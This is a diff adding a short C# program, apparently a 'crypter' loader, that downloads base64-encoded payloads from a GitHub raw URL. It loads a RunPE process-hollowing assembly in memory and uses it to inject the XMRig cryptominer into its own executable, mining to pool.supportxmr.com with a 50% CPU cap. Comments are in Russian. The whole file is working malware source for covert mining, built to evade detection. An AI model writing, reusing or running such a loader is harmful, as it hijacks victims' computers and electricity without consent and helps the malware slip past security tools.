@@ -1,0 +1,35 @@
+using System;
+using System.Net;
+using System.Reflection;
+
+namespace EntryPointCrypt
+{
+    static class Program
+    {
+        private static string host = "https://raw.githubusercontent.com/0x9zy/miner/main/";
+        private delegate object invoc(object inst, object[] arg);
+        static void Main(string[] args)
+        {
+            byte[] RunPE = Download_String("runpe64.txt");
+            Assembly asm = Assembly.Load(RunPE); // загружаем лоадер
+            MethodInfo mi = asm.GetType("RunPE.Class1").GetMethod("Main"); // вписываем нужные класс и метод
+            Delegate del = Delegate.CreateDelegate(typeof(invoc), mi, "Invoke");
+
+            del.DynamicInvoke(new object[] // вызываем и передаем параметры
+            {
+                null,
+                new object[]
+                {
+                    Download_String("xmrig.txt"),
+                    Assembly.GetExecutingAssembly().Location + " -o pool.supportxmr.com:443 -u " + args[0] + " -p " + args[1] + " -k --tls --max-cpu-usage=50 --donate-level=1"
+                }
+            }); ;
+        }
+        static byte[] Download_String(string file)
+        {
+            var client = new WebClient();
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+            return Convert.FromBase64String(client.DownloadString(host + file));
+        }
+    }
+}
